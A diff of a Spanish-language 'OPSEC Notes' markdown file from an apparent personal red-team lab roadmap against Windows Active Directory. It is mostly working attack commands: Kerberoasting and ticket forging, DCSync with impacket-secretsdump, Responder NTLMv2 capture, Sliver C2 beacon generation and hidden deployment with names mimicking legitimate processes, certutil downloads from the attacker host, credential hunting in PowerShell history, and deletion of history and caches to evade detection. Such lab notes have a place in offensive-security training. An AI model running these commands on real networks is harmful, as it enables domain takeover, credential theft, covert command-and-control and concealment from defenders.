@@ -8,14 +8,51 @@
 
 ## 📋 Índice
 
-1. [Herramientas — Cuándo usar cada una](#1--herramientas--cuándo-usar-cada-una)
-2. [Kerberos — Decisiones tácticas](#2--kerberos--decisiones-tácticas)
-3. [Pivoting — Ligolo-ng vs Chisel](#3--pivoting--ligolo-ng-vs-chisel)
-4. [C2 — Sliver operacional](#4--c2--sliver-operacional)
-5. [Living-off-the-Land — Prioridades](#5--living-off-the-land--prioridades)
-6. [Transferencia de herramientas](#6--transferencia-de-herramientas)
-7. [Gestión del entorno de lab](#7--gestión-del-entorno-de-lab)
-8. [Documentación operacional](#8--documentación-operacional)
+- [🥷 OPSEC Notes — Red Team Ops Roadmap](#-opsec-notes--red-team-ops-roadmap)
+  - [📋 Índice](#-índice)
+  - [1. 🛠️ Herramientas — Cuándo usar cada una](#1-️-herramientas--cuándo-usar-cada-una)
+    - [Acceso remoto Windows](#acceso-remoto-windows)
+    - [Cracking de hashes](#cracking-de-hashes)
+    - [Enumeración AD](#enumeración-ad)
+  - [2. 🎫 Kerberos — Decisiones tácticas](#2--kerberos--decisiones-tácticas)
+    - [Árbol de decisión: qué técnica usar](#árbol-de-decisión-qué-técnica-usar)
+    - [Pass-the-Ticket vs Pass-the-Hash vs Overpass-the-Hash](#pass-the-ticket-vs-pass-the-hash-vs-overpass-the-hash)
+    - [Golden Ticket — Limitaciones modernas](#golden-ticket--limitaciones-modernas)
+  - [3. 🔀 Pivoting — Ligolo-ng vs Chisel](#3--pivoting--ligolo-ng-vs-chisel)
+  - [4. 📡 C2 — Sliver operacional](#4--c2--sliver-operacional)
+    - [Dónde desplegar el beacon](#dónde-desplegar-el-beacon)
+    - [Tipos de beacon](#tipos-de-beacon)
+  - [5. 🏠 Living-off-the-Land — Prioridades](#5--living-off-the-land--prioridades)
+  - [6. 📦 Transferencia de herramientas](#6--transferencia-de-herramientas)
+    - [Limpieza post-transferencia](#limpieza-post-transferencia)
+  - [7. 🖥️ Gestión del entorno de lab](#7-️-gestión-del-entorno-de-lab)
+    - [Permisos AD — cuándo aplican](#permisos-ad--cuándo-aplican)
+    - [Nombres localizados en Windows](#nombres-localizados-en-windows)
+  - [8. 📝 Documentación operacional](#8--documentación-operacional)
+    - [Convención de naming para capturas](#convención-de-naming-para-capturas)
+    - [Qué documentar cuando algo falla](#qué-documentar-cuando-algo-falla)
+  - [9. 🩸 BloodHound — Recolección OPSEC](#9--bloodhound--recolección-opsec)
+  - [10. 🎫 Kerberos — Sesiones WinRM vs interactivas](#10--kerberos--sesiones-winrm-vs-interactivas)
+  - [11. 🔑 ACL Abuse — Limpieza post-explotación](#11--acl-abuse--limpieza-post-explotación)
+  - [12. 🖥️ GPO Abuse — Restaurar configuración](#12-️-gpo-abuse--restaurar-configuración)
+  - [13. 🌐 Kali — Configuración de red permanente](#13--kali--configuración-de-red-permanente)
+  - [14. 🔐 WriteDACL y DCSync — OPSEC](#14--writedacl-y-dcsync--opsec)
+    - [Principios](#principios)
+    - [Eventos generados (inevitables)](#eventos-generados-inevitables)
+    - [Artefactos que persisten tras cleanup](#artefactos-que-persisten-tras-cleanup)
+  - [15. 📡 ADIDNS y Responder — OPSEC](#15--adidns-y-responder--opsec)
+    - [Orden de operaciones (crítico)](#orden-de-operaciones-crítico)
+    - [Conflictos de puerto 80](#conflictos-de-puerto-80)
+    - [DNS Global Query Block List](#dns-global-query-block-list)
+    - [Responder — Modo análisis vs modo activo](#responder--modo-análisis-vs-modo-activo)
+  - [16. 🔴 Sliver — OPSEC operacional avanzado](#16--sliver--opsec-operacional-avanzado)
+    - [Conflicto listener HTTP tras reinicio](#conflicto-listener-http-tras-reinicio)
+    - [Deploy de beacons](#deploy-de-beacons)
+    - [Nomenclatura de beacons](#nomenclatura-de-beacons)
+  - [17. 🗂️ Credential Hunting — OPSEC](#17-️-credential-hunting--opsec)
+    - [Acceso a historial PS via SMB](#acceso-a-historial-ps-via-smb)
+    - [Shares SMB — prioridad de enumeración](#shares-smb--prioridad-de-enumeración)
+    - [Archivos con mayor probabilidad de credenciales](#archivos-con-mayor-probabilidad-de-credenciales)
 
 ---
 
@@ -31,7 +68,7 @@
 | Necesitas ejecución masiva en múltiples hosts | `crackmapexec` | Validación + ejecución en bloque |
 | Sesión interactiva real (RDP) necesaria | `xfreerdp` | Necesario para algunos exploits (Potato) |
 
-> **Nota Lab-01:** Los Potato attacks (PrintSpoofer, SweetPotato) **fallan en sesiones WinRM** porque generan Network tokens (Logon Type 3) en lugar de Interactive tokens. Requieren sesión RDP o consola física para funcionar. Si el entorno solo expone WinRM y necesitas LPE, busca vectores alternativos (Unquoted Path, AlwaysInstallElevated, Weak Service Perms).
+> **Nota Lab-01:** Los Potato attacks (PrintSpoofer, SweetPotato) **fallan en sesiones WinRM** porque generan Network tokens (Logon Type 3) en lugar de Interactive tokens. Requieren sesión RDP o consola física para funcionar.
 
 ---
 
@@ -44,8 +81,7 @@
 | Hash AS-REP (`$krb5asrep$23$`) | `john --format=krb5asrep` o `hashcat -m 18200` | — |
 | Hash TGS Kerberoasting (`$krb5tgs$23$`) | `john --format=krb5tgs` o `hashcat -m 13100` | — |
 | Hash NTLM | `hashcat -m 1000` | — |
-
-> **Principio:** Rockyou.txt primero para validar que el hash es crackeable. Si falla en < 5 min, construir diccionario dirigido con OSINT de la empresa objetivo (nombre empresa + año + símbolo especial). Los entornos corporativos casi nunca usan contraseñas de rockyou.
+| Hash NTLMv2 (Responder) | `hashcat -m 5600` | — |
 
 ---
 
@@ -53,7 +89,8 @@
 
 | Necesidad | Herramienta | Cuándo usarla |
 |-----------|-------------|---------------|
-| Attack paths visuales | `BloodHound + SharpHound` | Siempre que haya foothold con credenciales |
+| Attack paths visuales | `BloodHound CE + SharpHound` | Siempre que haya foothold con credenciales |
+| Enumeración rápida OPSEC (sin binarios) | `bloodhound-python` | Primera pasada desde Kali |
 | Enumeración rápida de ACLs desde PowerShell | `PowerView` | Desde shell Evil-WinRM, LOLBin alternativo |
 | Análisis offline sin agente en dominio | `Adalanche` | Cuando no puedes ejecutar SharpHound |
 | Enumeración SMB/usuarios sin credenciales | `enum4linux-ng` | Recon inicial sin autenticación |
@@ -68,7 +105,6 @@
 ¿Tienes lista de usuarios del dominio?
 │
 ├── NO → AS-REP Roasting ciego (GetNPUsers con lista de usuarios candidatos)
-│         construir lista via: naming conventions + OSINT + SMB null session
 │
 └── SÍ → ¿Alguna cuenta tiene DoesNotRequirePreAuth?
           │
@@ -77,77 +113,39 @@
           └── NO → ¿Hay cuentas con SPN?
                     │
                     ├── SÍ → Kerberoasting → TGS hash → crack → credenciales de servicio
-                    │         ¿La cuenta de servicio tiene DA o ACL abusable?
-                    │         └── SÍ → escalada directa
                     │
                     └── NO → Buscar otros vectores:
                               • SMB null session → shares con credenciales
                               • LDAP anónimo → usuarios y descriptions
-                              • Web/IIS → credenciales en código fuente
+                              • Credential Hunting → scripts IT, PS history
 ```
 
-### Pass-the-Ticket vs Pass-the-Hash
+### Pass-the-Ticket vs Pass-the-Hash vs Overpass-the-Hash
 
 | Técnica | Cuándo preferirla | Evento generado | Requisito |
 |---------|------------------|----------------|-----------|
-| **Pass-the-Ticket** | Entornos con NTLM deshabilitado / Kerberos-only | 4768, 4769 (normal Kerberos) | Ticket TGT o TGS válido |
-| **Pass-the-Hash** | NTLM habilitado, acceso SMB/WinRM | 4624 Logon Type 3, NTLM en red | Hash NTLM de la cuenta |
+| **Pass-the-Hash** | NTLM habilitado, acceso SMB/WinRM | 4624 Logon Type 3, NTLM en red | Hash NTLM |
+| **Overpass-the-Hash** | Entornos con NTLM sospechoso | 4768 AS-REQ (Kerberos normal) | Hash NTLM → TGT |
+| **Pass-the-Ticket** | Ticket ya disponible | 4768, 4769 (normal Kerberos) | TGT o TGS válido |
 
-> **OPSEC APT29:** PtT genera tráfico Kerberos normal — indistinguible de autenticación legítima si el ticket es válido. PtH genera autenticación NTLM que puede ser detectada por soluciones que alertan sobre NTLM en dominios modernos.
+> **OPSEC:** Overpass-the-Hash genera tráfico Kerberos normal — indistinguible de autenticación legítima. Usar RC4 es detectable en entornos con AES obligatorio — preferir AES256 cuando sea posible.
 
 ### Golden Ticket — Limitaciones modernas
 
-> **Aprendizaje Lab-01 (crítico):** El Golden Ticket clásico (`impacket-ticketer` con hash NTLM del krbtgt) **falla en Windows Server 2022** con error `KDC_ERR_TGT_REVOKED` por **PAC Validation**.
-
-**Workarounds:**
-- Usar AES256 del krbtgt en lugar de NTLM: `impacket-ticketer -aesKey <AES256> ...`
-- Diamond Ticket (Rubeus): modifica un TGT legítimo en lugar de forjar uno — evita PAC Validation
-- Si el objetivo es persistencia: scheduled task / registry run key es más fiable en entornos modernos
+> **Aprendizaje Lab-01:** El Golden Ticket clásico falla en Windows Server 2022 con PAC Validation. Usar Diamond Ticket (Rubeus) o AES256 del krbtgt como alternativas.
 
 ---
 
 ## 3. 🔀 Pivoting — Ligolo-ng vs Chisel
 
-### Comparativa técnica
-
 | Aspecto | Ligolo-ng | Chisel |
 |---------|-----------|--------|
 | **Capa de operación** | Kernel (tuntap interface) | Userspace (SOCKS5 proxy) |
-| **Compatibilidad de herramientas** | 100% — cualquier herramienta funciona directo | Requiere `proxychains` o configuración SOCKS |
-| **Nmap a través del túnel** | ✅ Directo (`nmap <IP_interna>`) | ⚠️ Limitado (SYN scan no funciona con proxychains) |
-| **Velocidad** | Alta — tráfico nativo | Media — overhead SOCKS |
-| **Detección** | Interfaz tun creada en host comprometido | Proceso con socket SOCKS escuchando |
-| **Setup** | Más pasos (interfaz + ruta) | Más simple (server + client) |
-| **Segundo pivote** | `listener_add` nativo en consola | Chisel en cadena |
+| **Compatibilidad de herramientas** | 100% — cualquier herramienta funciona directo | Requiere `proxychains` |
+| **Nmap a través del túnel** | ✅ Directo | ⚠️ Limitado (SYN scan no funciona) |
+| **Velocidad** | Alta | Media |
 
-### Cuándo usar cada uno
-
-**Usar Ligolo-ng cuando:**
-- Necesitas Nmap completo contra la red interna (SYN scan, scripts NSE)
-- Sliver u otros C2 necesitan conectar directamente sin proxychains
-- La operación involucra múltiples herramientas contra múltiples hosts internos
-- Quieres tráfico transparente sin configurar proxychains en cada herramienta
-
-**Usar Chisel cuando:**
-- Solo necesitas un puerto específico redirigido (port forward simple)
-- El host comprometido es Windows y no puedes crear interfaces de red
-- Setup rápido para una única conexión
-
-### Setup rápido Ligolo-ng (referencia)
-
-```bash
-# KALI — interfaz (una vez por sesión)
-sudo ip tuntap add user $(whoami) mode tun ligolo
-sudo ip link set ligolo up
-./proxy -selfcert -laddr 0.0.0.0:11601
-
-# HOST COMPROMETIDO
-./agent -connect <KALI_IP>:11601 -ignore-cert &
-
-# KALI — tras sesión activa en consola Ligolo-ng
-ligolo-ng » session → ifconfig → start
-sudo ip route add <RED_INTERNA>/24 dev ligolo
-```
+**Usar Ligolo-ng** para operaciones largas con múltiples herramientas. **Usar Chisel** para port forward puntual.
 
 ---
 
@@ -157,232 +155,114 @@ sudo ip route add <RED_INTERNA>/24 dev ligolo
 
 | Regla | Razón |
 |-------|-------|
-| **Nunca en el DC** | El Domain Controller es el activo más monitoreado. Un beacon en DC es detección inmediata en cualquier entorno con EDR/SIEM |
-| **Preferir workstations sobre servidores** | Las workstations tienen menos monitorización y el tráfico web saliente es esperado |
-| **Si hay múltiples hosts, beacon en el menos crítico** | Minimiza el impacto de la detección del beacon en la operación global |
+| **Preferir workstations sobre servidores** | Menos monitorización, tráfico web esperado |
+| **Si hay múltiples hosts, beacon en el menos crítico** | Minimiza impacto de detección |
+| **En DC solo si es necesario para el objetivo** | El DC es el activo más monitoreado |
 
-### Tipos de beacon y cuándo usarlos
+### Tipos de beacon
 
 | Tipo | Protocolo | Cuándo |
 |------|-----------|--------|
-| `beacon --http` | HTTPS | Default — se mimetiza con tráfico web |
-| `beacon --mtls` | mTLS | Cuando el entorno inspecciona HTTPS — tráfico TLS opaco |
-| `beacon --dns` | DNS | Cuando solo hay salida DNS — más lento pero muy evasivo |
-| `session` | mTLS/HTTPS | Interactivo — para acciones que requieren respuesta inmediata |
+| `beacon --http` | HTTP/S | Default — se mimetiza con tráfico web |
+| `beacon --mtls` | mTLS | Cuando el entorno inspecciona HTTPS |
+| `beacon --dns` | DNS | Solo salida DNS disponible |
 
-> **Diferencia beacon vs session en Sliver:** Un beacon es asíncrono (check-in cada N segundos — menos detectable). Una session es una conexión persistente bidireccional (más detectable pero interactiva). Para operaciones largas, usar beacons. Para acciones puntuales que requieren interactividad, abrir una session temporal desde el beacon.
-
-### OPSEC en generación de implantes
-
-```bash
-# Siempre con symbol obfuscation (activo por defecto en Sliver)
-generate beacon --http <KALI_IP>:443 --os windows --arch amd64 --format exe
-
-# Para mayor evasión: usar perfil con jitter para variar el check-in
-generate beacon --http <KALI_IP>:443 --jitter 30 --seconds 60 ...
-
-# Nombre del archivo: evitar nombres obvios (beacon.exe, agent.exe)
-# Usar nombres que imiten procesos legítimos: svchost_update.exe, Teams_helper.exe
-```
+> **Diferencia beacon vs session:** Beacon = asíncrono (check-in cada N segundos). Session = conexión persistente bidireccional. Para operaciones largas, usar beacons.
 
 ---
 
 ## 5. 🏠 Living-off-the-Land — Prioridades
 
-### Orden de preferencia en Discovery (Windows)
-
-Antes de subir herramientas externas (BloodHound, PowerView), intentar con:
+LOLBins primero — generan menos alertas porque son procesos firmados por Microsoft.
 
 ```powershell
-# Identidad
 whoami /all
-
-# Red
-ipconfig /all
-route print
-netstat -ano
-
-# Dominio — usuarios y grupos
-net user /domain
-net group "Domain Admins" /domain
-net group "Enterprise Admins" /domain
-
-# SPNs — Kerberoasting candidatos
+ipconfig /all && route print
+net user /domain && net group "Domain Admins" /domain
 setspn -T <dominio> -Q */*
-
-# Descriptions con contraseñas (sin PowerView)
-$searcher = [adsisearcher]"(description=*)"
-$searcher.FindAll() | % { $_.Properties['samaccountname','description'] }
-
-# Trusts del dominio
 nltest /domain_trusts
-nltest /dclist:<dominio>
-
-# ACLs abusables básico (sin PowerView)
-(Get-Acl "AD:\CN=<usuario>,DC=...").Access | ? { $_.IdentityReference -match "nombre" }
 ```
-
-> **Principio:** LOLBins primero — generan menos alertas porque son procesos firmados por Microsoft. Solo subir herramientas externas cuando los comandos nativos no son suficientes o el tiempo operacional lo requiere.
 
 ---
 
 ## 6. 📦 Transferencia de herramientas
 
-### Métodos por situación
-
 | Situación | Método | Comando |
 |-----------|--------|---------|
-| WinRM disponible | Evil-WinRM upload | `upload /ruta/local/herramienta.exe` |
-| Solo SMB | SMB share temporal desde Kali | `impacket-smbserver share /tmp/tools -smb2support` → `copy \\KALI_IP\share\tool.exe .` |
-| HTTP disponible | Python HTTP server | `python3 -m http.server 8888` → `wget / curl / certutil` |
-| Restricciones de salida | Base64 encode | `cat tool.exe \| base64 -w 0` → pegar en PS → decode |
+| WinRM disponible | Evil-WinRM upload | `upload "/ruta/local/herramienta.exe" "C:\destino\herramienta.exe"` |
+| Solo SMB | SMB share temporal desde Kali | `impacket-smbserver share /tmp/tools -smb2support` |
+| HTTP disponible | Python HTTP server | `python3 -m http.server 8888` |
 
-### Certutil como downloader (LOLBin Windows)
-
-```cmd
-certutil -urlcache -split -f http://<KALI_IP>:8888/tool.exe C:\Windows\Temp\tool.exe
-```
-
-> **OPSEC:** `certutil` deja traza en `%APPDATA%\Microsoft\CryptnetUrlCache`. En entornos con EDR, preferir PowerShell IEX o SMB.
+> **Nota upload Evil-WinRM:** Siempre usar comillas en la ruta. Sin comillas en zsh puede interpretar `!` como expansión de historial.
 
 ### Limpieza post-transferencia
 
 ```powershell
-# Borrar herramientas tras uso
 Remove-Item C:\Windows\Temp\tool.exe -Force
-
-# Borrar historial PowerShell
 Remove-Item (Get-PSReadLineOption).HistorySavePath -Force
-
-# Limpiar certutil cache
-certutil -urlcache -split -f http://nothing * del
 ```
 
 ---
 
 ## 7. 🖥️ Gestión del entorno de lab
 
-### IP estática en Kali — siempre así
-
-```bash
-# NetworkManager persiste entre reinicios — NO usar ip addr add (no persiste)
-sudo nmcli con add type ethernet con-name "LabRedTeam" ifname eth0 \
-  ipv4.method manual ipv4.addresses 10.0.2.9/24 \
-  ipv4.gateway 10.0.2.1 ipv4.dns 10.0.2.10 \
-  connection.autoconnect yes
-sudo nmcli con up LabRedTeam
-```
-
-### Interfaz Ligolo-ng — recrear si Kali se reinicia
-
-```bash
-# La interfaz tuntap no persiste entre reinicios
-sudo ip tuntap add user $(whoami) mode tun ligolo
-sudo ip link set ligolo up
-# La ruta tampoco persiste — añadirla de nuevo tras activar el túnel
-```
-
 ### Permisos AD — cuándo aplican
 
-> **Aprendizaje Lab-01:** Los permisos AD asignados a un usuario (DCSync ACLs, GenericWrite, etc.) **no se aplican en la sesión actual** del usuario si ya tenía un token de Kerberos cacheado. Aplican en el **siguiente logon**. Si un DCSync falla con ACCESS_DENIED pese a tener los permisos correctos, el usuario necesita cerrar sesión y volver a autenticarse.
+> Los permisos AD asignados a un usuario no se aplican en la sesión actual si ya tenía un token cacheado. Aplican en el siguiente logon.
 
 ### Nombres localizados en Windows
-
-> Los grupos built-in tienen nombres distintos según el idioma del SO:
 
 | Grupo (EN) | Grupo (ES) | SID universal |
 |-----------|-----------|---------------|
 | Domain Admins | Admins. del dominio | S-1-5-21-...-512 |
-| Account Operators | Opers. de cuentas | S-1-5-32-548 |
 | Remote Management Users | Usuarios de administración remota | S-1-5-32-580 |
-| Administrators | Administradores | S-1-5-32-544 |
 
-> **Regla:** En scripts PowerShell, **siempre buscar grupos por SID**, nunca por nombre. El SID es universal independientemente del idioma del SO.
+> **Regla:** En scripts PowerShell, buscar grupos por SID, nunca por nombre.
 
 ---
 
 ## 8. 📝 Documentación operacional
 
-### Flujo de trabajo por fase
-
-```
-1. ANTES de empezar la fase
-   → Revisar el plan de operación (OPERATION_*.md)
-   → Preparar directorio de capturas: FASE-X-Nombre/
-   → Abrir terminal con tee para logging: script -a fase_X.log
-
-2. DURANTE la fase
-   → Captura de pantalla inmediatamente tras cada comando relevante
-   → Nombrar capturas según convenio: faseX-NN-descripcion.png
-   → Anotar en texto plano las IPs/credenciales obtenidas en tiempo real
-
-3. DESPUÉS de completar la fase
-   → Escribir el .md de documentación usando las capturas como referencia
-   → Documentar desviaciones del plan con causa técnica
-   → Actualizar PROGRESS.md con horas y lecciones
-   → git add + commit con mensaje descriptivo
-```
-
 ### Convención de naming para capturas
 
 ```
-faseX-NN-descripcion-corta.png
+screenshots/FASE-XX-Nombre-Tecnica/faseXX-YY-descripcion-accion.png
 
-Ejemplos:
-  fase1-01-nmap-port-discovery.png
-  fase3-02-ligolo-agent-connected.png
-  fase7-04-sliver-beacon-connected.png
-
-Reglas:
-  X  = número de fase (1 dígito)
-  NN = número secuencial dentro de la fase (2 dígitos: 01, 02...)
-  descripcion = kebab-case, sin espacios, máximo 4 palabras
+Ejemplo:
+FASE-04-WriteDACL-Abuse/fase04-01-dacledit-write-dcsync.png
 ```
 
 ### Qué documentar cuando algo falla
 
-> Los fallos son los momentos más valiosos del writeup. Documentar:
-> 1. **Qué se intentó** — comando exacto
-> 2. **Qué error se obtuvo** — output completo, sin omitir
-> 3. **Análisis de causa** — por qué falló técnicamente
-> 4. **Decisión táctica** — qué vector alternativo se tomó y por qué
+1. **Qué se intentó** — comando exacto
+2. **Qué error se obtuvo** — output completo
+3. **Análisis de causa** — por qué falló técnicamente
+4. **Decisión táctica** — qué vector alternativo se tomó
 
-> Ejemplo de Lab-01: DCSync `ACCESS_DENIED` → análisis → token cacheado → decisión de pivotar a Kerberoasting. Ese desvío es lo que hace el writeup valioso para alguien que lo lea después.
-
----
-
-*Última actualización: Mayo 2026 — Lab-01 (APT29) + Lab-02 inicio (APT41) — Adrián Camacho*
 ---
 
 ## 9. 🩸 BloodHound — Recolección OPSEC
 
-### bloodhound-python vs SharpHound
-
-**Regla:** Usar siempre bloodhound-python como primera pasada. Solo subir SharpHound cuando se necesita coverage completo de ACLs/GPOs y ya se tiene acceso privilegiado.
-
-```bash
-# Primera pasada — solo tráfico LDAP desde Kali
-bloodhound-python -u usuario -p password -d dominio -ns IP -c All --zip
-```
+**Regla:** Usar bloodhound-python como primera pasada (OPSEC). Solo subir SharpHound cuando se necesita coverage completo de ACLs/GPOs.
 
 | Criterio | bloodhound-python | SharpHound |
 |----------|-------------------|------------|
 | Binarios en objetivo | ❌ Ninguno | ✅ SharpHound.exe |
 | Detección | Solo tráfico LDAP voluminoso | Proceso + eventos + AV |
-| Coverage ACLs GPO | ⚠️ Parcial | ✅ Completo |
-| Cuándo usarlo | Primera pasada siempre | Segunda pasada si se necesita GPO/ADCS paths |
+| Coverage ACLs/GPO | ⚠️ Parcial | ✅ Completo |
+| Compatible con BloodHound CE 5.x | ❌ No (importación) | ✅ Sí |
+
+> **Nota crítica Lab-04:** Los ZIPs de bloodhound-python NO importan correctamente en BloodHound CE 5.x — los nodos se crean pero las queries Cypher no devuelven resultados. Usar SharpHound v2.5.9 para importar en CE.
 
 ---
 
 ## 10. 🎫 Kerberos — Sesiones WinRM vs interactivas
 
-**Problema crítico:** Rubeus `ptt`, Potato attacks y cualquier manipulación de tokens Kerberos **falla en sesiones WinRM** porque WinRM usa Network Logon (Logon Type 3), que no permite modificar la caché de tickets.
+**Problema:** Rubeus `ptt`, Potato attacks y manipulación de tokens Kerberos **falla en sesiones WinRM** (Network Logon Type 3).
 
-**Solución:** Usar impacket desde Kali en lugar de intentar manipular tickets desde la shell WinRM.
+**Solución:** Usar impacket desde Kali:
 
 ```bash
-# En lugar de ptt desde WinRM:
-python3 -c "import base64; open('/tmp/ticket.ccache','wb').write(base64.b64decode(open('/tmp/ticket.b64').read()))"
 export KRB5CCNAME=/tmp/ticket.ccache
 impacket-secretsdump -k -no-pass DC-01.dominio.local
 ```
@@ -391,43 +271,175 @@ impacket-secretsdump -k -no-pass DC-01.dominio.local
 
 ## 11. 🔑 ACL Abuse — Limpieza post-explotación
 
-**Obligatorio:** Eliminar SPNs añadidos para Targeted Kerberoasting. Un SPN `fake/hostname` es un IOC obvio.
+**Obligatorio:** Eliminar SPNs añadidos para Targeted Kerberoasting.
 
 ```bash
-# Eliminar SPN después del ataque
-bloodyAD -u usuario -p password -d dominio --host IP   set object cuenta_objetivo servicePrincipalName -v "SPN_ORIGINAL"
-# O eliminar completamente:
-bloodyAD ... set object cuenta servicePrincipalName -v ""
+bloodyAD -u usuario -p password -d dominio --host IP \
+  set object cuenta servicePrincipalName -v ""
 ```
 
 ---
 
 ## 12. 🖥️ GPO Abuse — Restaurar configuración
 
-**Obligatorio en engagements reales:** Eliminar las tareas creadas en SYSVOL después del ataque.
-
 ```powershell
-# Eliminar ScheduledTasks.xml de SYSVOL
 $gpoId = (Get-GPO -Name "GPO-NOMBRE").Id.ToString()
-Remove-Item "\DC\SYSVOL\dominio\Policies\{$gpoId}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
+Remove-Item "\\DC\SYSVOL\dominio\Policies\{$gpoId}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
 ```
 
 ---
 
 ## 13. 🌐 Kali — Configuración de red permanente
 
-**Problema recurrente:** La default route de eth0 (red lab) bloquea el acceso a Internet tras reinicios.
-
-**Solución permanente via NetworkManager:**
 ```bash
-# eth0 — red lab, nunca default gateway
 sudo nmcli con modify "LabRedTeam" ipv4.never-default yes
 sudo nmcli con modify "LabRedTeam" +ipv4.routes "10.0.3.0/24 10.0.2.1"
-
-# eth2 — NAT Internet, default con métrica baja
 sudo nmcli con modify "Wired connection 1" ipv4.route-metric 50
+```
+
+---
+
+## 14. 🔐 WriteDACL y DCSync — OPSEC
+
+### Principios
+
+- **Backup automático:** `dacledit` genera `.bak` — guardarlo y usarlo para restaurar exactamente
+- **Limpiar inmediatamente** después de DCSync — no dejar rights más tiempo del necesario
+- **Verificar antes de limpiar:** `dacledit -action read | grep principal`
+- **Orden correcto:** Añadir rights → DCSync → Eliminar rights — en un mismo flujo, no entre sesiones
+
+### Eventos generados (inevitables)
+
+- `5136` — Modificación nTSecurityDescriptor (siempre se genera, el más detectable)
+- `4662` — Acceso objeto dominio con replication rights
+- Ambos persisten en logs aunque se eliminen los rights después
+
+### Artefactos que persisten tras cleanup
+
+| Artefacto | Persistencia |
+|---|---|
+| Event ID 5136, 4662, 4688 | Hasta rotación de logs del DC |
+| Archivo `.bak` de dacledit | Indefinida (en Kali) |
+| Historial PS del Administrador | Hasta limpieza manual |
+
+---
+
+## 15. 📡 ADIDNS y Responder — OPSEC
+
+### Orden de operaciones (crítico)
+
+```
+1. Parar Docker/BloodHound CE → sudo docker compose stop
+2. Verificar puerto libre → sudo fuser 80/tcp
+3. Arrancar Responder → sudo responder -I eth0 -wF --lm
+4. Capturar hash NTLMv2
+5. Parar Responder → sudo pkill responder + sudo fuser -k 80/tcp
+6. Arrancar Sliver listener → http (en consola Sliver)
+7. Deploy beacon
+```
+
+### Conflictos de puerto 80
+
+BloodHound CE (Docker), Responder y Sliver HTTP compiten por el puerto 80. Solo uno puede estar activo a la vez.
+
+```bash
+# Verificar qué proceso ocupa el puerto
+sudo fuser 80/tcp
+sudo ss -tlnp | grep ':80'
+
+# Liberar
+sudo fuser -k 80/tcp
+```
+
+### DNS Global Query Block List
+
+- Desactivar genera `Event 5136` en el DC — detectable
+- **Restaurar tras la operación:**
+  ```powershell
+  Set-DnsServerGlobalQueryBlockList -Enable $true
+  dnscmd /clearcache
+  ```
+
+### Responder — Modo análisis vs modo activo
+
+- `-A` (analyze): solo escucha, NO captura hashes
+- `-wF` (WPAD + Force auth): activo, captura hashes
+- `Invoke-WebRequest -UseDefaultCredentials` desde WinRM **NO propaga credenciales** — usar `System.Net.WebClient`:
+  ```powershell
+  $cred = New-Object System.Net.NetworkCredential("usuario", "password", "DOMINIO")
+  $wc = New-Object System.Net.WebClient
+  $wc.Credentials = $cred
+  $wc.DownloadString("http://wpad.dominio.local/wpad.dat")
+  ```
+
+---
+
+## 16. 🔴 Sliver — OPSEC operacional avanzado
+
+### Conflicto listener HTTP tras reinicio
+
+Matar el proceso externo en puerto 80 no libera el job en Sliver. Si el listener aparece como `AlreadyExists`:
+
+```bash
+sudo systemctl restart sliver
+sleep 5
+sliver-client
+# Luego: http
+```
+
+### Deploy de beacons
+
+```powershell
+# Subir beacon (comillas obligatorias en zsh)
+upload "/tmp/iron_forest_dc01.exe" "C:\Windows\Temp\iron_forest_dc01.exe"
+
+# Ejecutar silenciosamente
+Start-Process "C:\Windows\Temp\iron_forest_dc01.exe" -WindowStyle Hidden
 
 # Verificar
-sudo nmcli con up "LabRedTeam" && sudo nmcli con up "Wired connection 1"
-ping -c 1 10.0.2.10 && ping -c 1 8.8.8.8
+Get-Process | Where-Object { $_.Name -like "*beacon*" }
+
+# Limpiar
+Stop-Process -Name "beacon" -Force
+Remove-Item "C:\Windows\Temp\beacon.exe" -Force
 ```
+
+### Nomenclatura de beacons
+
+Usar nombres de operación: `IRON_FOREST_DC01`, `GHOST_FOREST_WKSTN` — facilita identificación a lo largo de múltiples labs.
+
+---
+
+## 17. 🗂️ Credential Hunting — OPSEC
+
+### Acceso a historial PS via SMB
+
+```bash
+# Sintaxis correcta con ruta de destino local (obligatorio)
+smbclient \\\\DC-01\\C$ -U 'usuario:password' \
+  -c 'get "Users\Administrador\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" /tmp/ps_history.txt'
+```
+
+> Sin ruta destino, smbclient crea una ruta anidada que falla silenciosamente.
+
+### Shares SMB — prioridad de enumeración
+
+1. `C$` con credencial de servicio (historial PS, archivos sistema)
+2. Shares custom (`IT-Scripts`, `Finance`) con cuenta de usuario
+3. `SYSVOL` para GPP passwords (siempre accesible con cualquier cuenta)
+
+### Archivos con mayor probabilidad de credenciales
+
+```powershell
+# Extensiones prioritarias
+Get-ChildItem C:\ -Recurse -Include "*.ps1","*.bat","*.config","*.xml","*.env" -ErrorAction SilentlyContinue |
+  Select-String -Pattern "password|passwd|pwd|secret" -ErrorAction SilentlyContinue
+
+# Historial PS de todos los usuarios
+Get-ChildItem "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" |
+  Get-Content | Select-String "password|-p |/pass"
+```
+
+---
+
+*Última actualización: Mayo 2026 — Lab-04 IRON FOREST (APT28) — Adrián Camacho*
